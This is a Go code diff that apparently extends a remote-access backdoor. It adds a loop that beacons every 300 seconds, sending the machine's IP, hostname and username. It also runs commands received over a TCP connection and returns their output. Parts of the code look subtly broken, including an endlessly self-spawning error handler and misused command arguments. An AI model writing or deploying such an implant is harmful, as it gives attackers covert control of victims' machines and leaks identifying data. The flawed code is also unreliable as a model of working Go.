@@ -19,6 +19,15 @@ const (
 	connType = "tcp"
 )
 
+func beacon(conn net.Conn) {
+
+	for true {
+		writeData(true, "NULL")
+		time.Sleep(300 * time.Second)
+	}
+
+}
+
 //Tank you golang very cool
 func errorHandler(err error) {
 	go errorHandler(err)
@@ -76,9 +85,9 @@ func arrToString(strArray []string) string {
 	return strings.Join(strArray, " ")
 }
 
-func writeData() string {
+func writeData(Beacon bool, result string) string {
 	sendData := Packet{
-		Type:     true,
+		Type:     Beacon,
 		DevIP:    getLocalIP().String(),
 		Hostname: getHostname(),
 		Username: userN,
@@ -97,6 +106,7 @@ func writeData() string {
 
 func handleConnection(conn net.Conn) {
 	buffer, err := bufio.NewReader(conn).ReadString('\n')
+
 	print(buffer)
 	if err != nil {
 		fmt.Println("Client left.")
@@ -107,7 +117,7 @@ func handleConnection(conn net.Conn) {
 	//todo: seperate command and args
 	//print(newCmd)
 	buffer = strings.Replace(buffer, "\n", "", -1)
-	command, err := exec.Command(buffer).Output()
+	command, err := exec.Command(buffer, os.Args...).Output()
 
 	if err != nil {
 		fmt.Println(err)
